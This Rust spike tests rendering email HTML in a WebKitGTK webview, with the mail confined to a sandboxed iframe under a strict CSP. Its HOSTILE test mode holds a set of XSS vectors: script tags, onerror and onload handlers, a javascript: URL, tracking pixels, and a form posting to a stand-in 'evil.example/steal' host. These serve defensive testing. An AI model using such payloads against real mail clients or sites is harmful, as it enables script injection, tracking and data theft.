//! Spike: render real mail HTML in the WebKitGTK webview (the engine Tauri wraps via wry), as a
//! TOP-LEVEL window — no Slint, no embedding, no GL-context collision. Answers three questions:
//!
//!   1. Does the webview open on this X11 box without the GLXBadWindow crash?  (embedding was the bug)
//!   2. Does the user's real .eml render *correctly* — the thing Blitz never managed?
//!   3. Does the security model hold: mail confined to a script-free sandboxed iframe, CSP blocking
//!      trackers, links escaping to the system browser instead of navigating the app?
//!
//! Run:  cargo run                      → images BLOCKED (the shipping default; proves the CSP)
//!       GELEIT_SPIKE_IMAGES=1 cargo run → images allowed (proves fidelity vs Thunderbird)
use geleit_engine::{message, safehtml};
use tao::{
    event::{Event, WindowEvent},
    event_loop::{ControlFlow, EventLoop},
    window::WindowBuilder,
};
use wry::WebViewBuilder;

/// Build the mail document. Deliberately does NOT use `safehtml::document()`: that carries two
/// **Blitz workarounds** we must not inherit — `add_font_fallbacks` (Blitz dropped digit glyphs) and
/// `table{border-collapse:separate!important}` (Blitz drew phantom borders). The second is actively
/// WRONG for a real engine: it would break every email that legitimately collapses its table borders.
/// This is the honest "what does WebKit do with the mail as-is" test.
fn mail_document(sanitized_body: &str, allow_remote_images: bool) -> String {
    let img_src = if allow_remote_images {
        "data: cid: https: http:"
    } else {
        "data: cid:"
    };
    format!(
        "<!doctype html><html><head><meta charset=\"utf-8\">\
         <meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'; \
img-src {img_src}; style-src 'unsafe-inline'; font-src data:; form-action 'none'; base-uri 'none'\">\
         <base target=\"_blank\">\
         <style>html{{font-family:system-ui,sans-serif;color:#1f2a2e;background:#fff;\
margin:0;padding:12px;line-height:1.5}}img{{max-width:100%;height:auto}}</style>\
         </head><body>{sanitized_body}</body></html>"
    )
}

/// Escape for an HTML attribute value, so the document can ride in `<iframe srcdoc="...">`.
/// The parser reverses this before parsing the value as HTML, so it round-trips exactly.
fn attr_escape(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('"', "&quot;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
}

fn main() -> wry::Result<()> {
    let path = std::env::var("GELEIT_SPIKE_EML")
        .unwrap_or_else(|_| "../../test_mail_rendering.eml".to_string());
    let allow_images = std::env::var("GELEIT_SPIKE_IMAGES").is_ok();
    let scroll: i32 = std::env::var("GELEIT_SPIKE_SCROLL")
        .ok()
        .and_then(|s| s.parse().ok())
        .unwrap_or(0);

    let raw = std::fs::read(&path).unwrap_or_else(|e| panic!("cannot read {path}: {e}"));
    let mail = message::parse_eml(&raw);
    let body = mail.html.unwrap_or_else(|| {
        format!(
            "<pre>{}</pre>",
            mail.plain.unwrap_or_else(|| "(no body)".into())
        )
    });

    // GELEIT_SPIKE_HOSTILE: feed deliberately malicious HTML **straight past the sanitizer**, to test
    // the sandbox + CSP on their own (defense in depth). If any of these fire, the page paints a red
    // "PWNED" banner; a clean render means every vector was inert with the sanitizer switched OFF.
    let sanitized = if std::env::var("GELEIT_SPIKE_HOSTILE").is_ok() {
        println!("HOSTILE MODE: sanitizer BYPASSED — testing sandbox+CSP alone");
        r##"<h2>Hostile-payload test (sanitizer bypassed)</h2>
           <p>Every vector below is live. A red PWNED banner = something executed.</p>
           <script>document.body.innerHTML='<h1 style=background:red>PWNED: inline script ran</h1>'</script>
           <img src=x onerror="document.body.innerHTML='<h1 style=background:red>PWNED: onerror ran</h1>'">
           <svg onload="document.body.innerHTML='<h1 style=background:red>PWNED: svg onload</h1>'"></svg>
           <body onload="document.body.innerHTML='<h1 style=background:red>PWNED: body onload</h1>'">
           <iframe src="https://example.com/tracker"></iframe>
           <img src="https://example.com/tracking-pixel.gif" width="1" height="1">
           <form action="https://evil.example/steal"><input name="x"><input type=submit value="submit"></form>
           <a href="javascript:document.body.innerHTML='<h1>PWNED: javascript: URL</h1>'">javascript: link</a>
           <link rel="stylesheet" href="https://example.com/remote.css">
           <p style="background:url('https://example.com/css-tracker.png')">CSS remote-url tracker</p>
           <p>If you can read this line, with no red banner above, everything was blocked.</p>"##
            .to_string()
    } else if allow_images {
        safehtml::sanitize_html_allowing_remote(&body)
    } else {
        safehtml::sanitize_html(&body)
    };
    let doc = mail_document(&sanitized, allow_images);
    println!(
        "subject: {:?}\nremote images: {}\nsanitized body: {} bytes",
        mail.subject,
        if allow_images { "ALLOWED" } else { "BLOCKED by CSP" },
        sanitized.len()
    );

    // The app shell. Mail lives in an iframe with NO allow-scripts and NO allow-same-origin: scripts
    // cannot run and the mail cannot reach the shell, the IPC bridge, or the filesystem. `allow-popups
    // -to-escape-sandbox` lets a link click surface as a new-window request we intercept below.
    let shell = format!(
        "<!doctype html><html><head><meta charset=\"utf-8\"><style>\
         html,body{{margin:0;height:100%;background:#fbfaf7;font-family:system-ui,sans-serif}}\
         .bar{{height:40px;display:flex;align-items:center;padding:0 14px;color:#1f2a2e;\
         border-bottom:1px solid #e3e0d8;font-size:13px}}\
         iframe{{width:100%;height:{ih};border:0;display:block;background:#fff}}\
         </style></head><body>\
         <div class=\"bar\">spike: WebKit reading pane — mail in a script-free sandboxed iframe</div>\
         <iframe sandbox=\"allow-popups allow-popups-to-escape-sandbox\" srcdoc=\"{}\"></iframe>\
         </body></html>",
        attr_escape(&doc),
        // Screenshot aid only: with GELEIT_SPIKE_SCROLL we grow the iframe and scroll the *shell*
        // (we can't script into the sandboxed iframe — which is exactly the point of the sandbox).
        ih = if scroll > 0 {
            "9000px".to_string()
        } else {
            "calc(100% - 41px)".to_string()
        }
    );

    let event_loop = EventLoop::new();
    let window = WindowBuilder::new()
        .with_title("GeleitMail — WebKit spike")
        .with_inner_size(tao::dpi::LogicalSize::new(1100.0, 900.0))
        .build(&event_loop)
        .unwrap();

    let builder = WebViewBuilder::new()
        .with_html(&shell)
        // A link click must NOT navigate the app — it opens in the user's real browser.
        .with_new_window_req_handler(|url, _features| {
            println!("link clicked → opening externally: {url}");
            let _ = std::process::Command::new("xdg-open").arg(&url).spawn();
            wry::NewWindowResponse::Deny // never let the webview open it
        })
        // Belt and braces: the shell itself may never navigate away from the in-memory page.
        .with_navigation_handler(|url| {
            let allowed = url.starts_with("about:") || url.starts_with("data:");
            if !allowed {
                println!("navigation BLOCKED: {url}");
            }
            allowed
        });

    #[cfg(not(target_os = "linux"))]
    let _webview = builder.build(&window)?;
    #[cfg(target_os = "linux")]
    let _webview = {
        use tao::platform::unix::WindowExtUnix;
        use wry::WebViewBuilderExtUnix;
        builder.build_gtk(window.default_vbox().unwrap())?
    };

    println!("webview up — no GL context to collide with (this window IS the webview)");
    if scroll > 0 {
        let _ = _webview.evaluate_script(&format!("window.scrollTo(0,{scroll})"));
    }

    event_loop.run(move |event, _, control_flow| {
        *control_flow = ControlFlow::Wait;
        if let Event::WindowEvent {
            event: WindowEvent::CloseRequested,
            ..
        } = event
        {
            *control_flow = ControlFlow::Exit;
        }
    });
}
